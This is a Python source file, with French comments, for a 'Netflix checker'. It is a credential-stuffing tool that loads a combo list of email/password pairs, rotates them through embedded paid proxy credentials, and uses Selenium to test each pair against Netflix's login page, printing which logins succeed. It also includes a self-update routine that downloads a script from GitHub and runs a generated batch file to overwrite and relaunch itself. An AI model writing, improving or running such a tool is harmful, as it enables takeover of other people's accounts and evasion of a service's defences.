import os
import json
import time
import tkinter as tk
from tkinter import filedialog
import requests
import shutil  # Pour remplacer les fichiers
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.firefox.options import Options
from colorama import Fore, Style, init
import sys
import subprocess  # Pour relancer le script
import tempfile  # Pour utiliser un fichier temporaire

# Initialisation de Colorama
init(autoreset=True)

# Version actuelle du script
CURRENT_VERSION = "1.0.2"

# URL du fichier texte qui contient la version la plus récente
VERSION_URL = "https://exemple.com/latest_version.txt"

# URL de téléchargement de la nouvelle version
DOWNLOAD_URL = "https://github.com/Sukidadev/netflixchecker/blob/main/netflixchecker.py"

# Liste des proxys à utiliser
proxies = [
    "93291889-zone-custom-region-FR-sessid-DgtOgfNY-sessTime-60:0llEad0L@f.proxys5.net:6200",
    "93291889-zone-custom-region-FR-sessid-PK0y3olo-sessTime-60:0llEad0L@f.proxys5.net:6200",
]

def center(var: str, space: int = None):  # From Pycenter
    if not space:
        space = (os.get_terminal_size().columns- len(var.splitlines()[int(len(var.splitlines()) / 2)])) / 2
    
    return "\n".join((" " * int(space)) + var for var in var.splitlines())

def print_ascii_art():
    art_left = r"""
  ██████  █    ██  ██ ▄█▀ 
▒██    ▒  ██  ▓██▒ ██▄█▒ 
░ ▓██▄   ▓██  ▒██░▓███▄░ 
  ▒   ██▒▓▓█  ░██░▓██ █▄ 
▒██████▒▒▒▒█████▓ ▒██▒ █▄
▒ ▒▓▒ ▒ ░░▒▓▒ ▒ ▒ ▒ ▒▒ ▓▒
░ ░▒  ░  ░░▒░ ░ ░ ░ ░▒ ▒░
░  ░  ░   ░░░ ░ ░ ░ ░░ ░ 
      ░     ░     ░  ░   
    """

    art_right = r"""
  ██▓▓ █████▄  ▄▄▄     
▒▓██▒▒ ██▀ ██▌▒████▄   
▒▒██▒░ ██   █▌▒██  ▀█▄ 
░░██░░ ▓█▄   ▌░██▄▄▄▄██
░░██░░▒ ████▓ ▒▓█   ▓██
 ░▓   ▒▒ ▓  ▒ ░▒▒   ▓▒█
░ ▒ ░  ░  ▒  ▒ ░ ░   ▒▒ 
░ ▒ ░  ░  ░  ░   ░   ▒  
  ░      ░          ░   
    """

    for left, right in zip(art_left.splitlines(), art_right.splitlines()):
        print(center(Fore.RED + left + Fore.RED + right))
    print(center(f"{Fore.RED}\ngithub.com/sukidadev\n{Fore.RESET}"))

def check_version():
    try:
        # Récupère la version la plus récente depuis l'URL
        response = requests.get(VERSION_URL)
        latest_version = response.text.strip()

        if CURRENT_VERSION != latest_version:
            print(f"{Fore.RED}[ERROR] Vous utilisez la version {CURRENT_VERSION}.")
            print(f"{Fore.RED}[INFO] Une nouvelle version ({latest_version}) est disponible. Téléchargement en cours...{Style.RESET_ALL}")
            download_new_version()  # Télécharge et remplace le fichier actuel
            schedule_update()  # Planifie la mise à jour après fermeture du script
    except requests.RequestException as e:
        print(f"{Fore.RED}[ERROR] Impossible de vérifier la version. Détails : {e}")
        exit(1)  # Si la version ne peut pas être vérifiée, on empêche l'exécution

def download_new_version():
    try:
        # Télécharge la nouvelle version dans un fichier temporaire
        response = requests.get(DOWNLOAD_URL, stream=True)
        if response.status_code == 200:
            # Sauvegarde la nouvelle version dans un fichier temporaire
            temp_dir = tempfile.gettempdir()
            new_version_path = os.path.join(temp_dir, "updated_script.py")
            with open(new_version_path, 'wb') as f:
                shutil.copyfileobj(response.raw, f)
            print(f"{Fore.GREEN}[INFO] Nouvelle version téléchargée avec succès dans {new_version_path}.{Style.RESET_ALL}")
            return new_version_path
        else:
            print(f"{Fore.RED}[ERROR] Impossible de télécharger la nouvelle version.{Style.RESET_ALL}")
            exit(1)
    except requests.RequestException as e:
        print(f"{Fore.RED}[ERROR] Erreur lors du téléchargement de la nouvelle version : {e}{Style.RESET_ALL}")
        exit(1)

def schedule_update():
    print(f"{Fore.CYAN}[INFO] Mise à jour planifiée. Le script se relancera avec la nouvelle version après fermeture.{Style.RESET_ALL}")
    script_path = sys.argv[0]
    new_version_path = download_new_version()

    # Crée un script batch pour remplacer l'ancien fichier et relancer le script
    update_script = f"""
    @echo off
    timeout /t 3 >nul
    copy /y "{new_version_path}" "{script_path}"
    start "" "{sys.executable}" "{script_path}"
    exit
    """
    
    # Sauvegarde le batch dans un fichier temporaire
    batch_path = os.path.join(tempfile.gettempdir(), "update_script.bat")
    with open(batch_path, 'w') as batch_file:
        batch_file.write(update_script)
    
    # Exécute le script batch
    subprocess.Popen([batch_path], shell=True)
    exit(0)  # Quitte le script actuel pour permettre la mise à jour

def check_credentials(email, password, proxy):
    options = Options()
    options.add_argument(f'--proxy-server=http://{proxy}')
    
    driver = webdriver.Firefox(options=options)
    
    driver.get("https://www.netflix.com/login")
    
    username_field = driver.find_element(By.NAME, "userLoginId")
    password_field = driver.find_element(By.NAME, "password")
    
    username_field.send_keys(email)
    password_field.send_keys(password)
    
    password_field.send_keys(Keys.RETURN)
    
    time.sleep(5)
    
    login_successful = "incorrect" not in driver.page_source
    
    driver.quit()
    return login_successful

def run_script(file_path):
    try:
        if os.path.getsize(file_path) == 0:
            print(f"{Fore.RED}[ERROR] Le fichier combo.json est vide.{Style.RESET_ALL}")
            return

        with open(file_path, 'r') as file:
            combos = json.load(file)
            print(f"{Fore.CYAN}[INFO] Démarrage de la vérification...\n{Style.RESET_ALL}")

            for i, combo in enumerate(combos):
                email = combo["email"]
                password = combo["password"]
                proxy = proxies[i % len(proxies)]

                result = f"Test de connexion pour {email}:{password} via proxy {proxy}..."
                print(result)

                if check_credentials(email, password, proxy):
                    print(f"{Fore.GREEN}[SUCCESS] Connexion réussie pour: {email}:{password}\n{Style.RESET_ALL}")
                else:
                    print(f"{Fore.RED}[FAIL] La connexion a échoué pour: {email}:{password}\n{Style.RESET_ALL}")

            print(f"{Fore.CYAN}[INFO] Vérification terminée.\n{Style.RESET_ALL}")
    except FileNotFoundError:
        print(f"{Fore.RED}[ERROR] Le fichier combo.json n'a pas été trouvé.{Style.RESET_ALL}")
    except json.JSONDecodeError:
        print(f"{Fore.RED}[ERROR] Format invalide dans le fichier JSON.{Style.RESET_ALL}")

def open_file_dialog():
    root = tk.Tk()
    root.withdraw()

    file_path = filedialog.askopenfilename(
        title="Sélectionner le fichier combo.json",
        filetypes=[("Fichier JSON", "*.json")]
    )
    
    if file_path:
        print(f"{Fore.CYAN}[INFO] Fichier sélectionné : {file_path}{Style.RESET_ALL}")
        return file_path
    else:
        print(f"{Fore.RED}[ERROR] Aucun fichier sélectionné.{Style.RESET_ALL}")
        return None

def main():
    print_ascii_art()
    
    check_version()  # Vérifier la version avant de continuer

    file_path = open_file_dialog()

    if file_path:
        run_script(file_path)
    else:
        print(f"{Fore.RED}[ERROR] Processus annulé.{Style.RESET_ALL}")

if __name__ == "__main__":
    main()
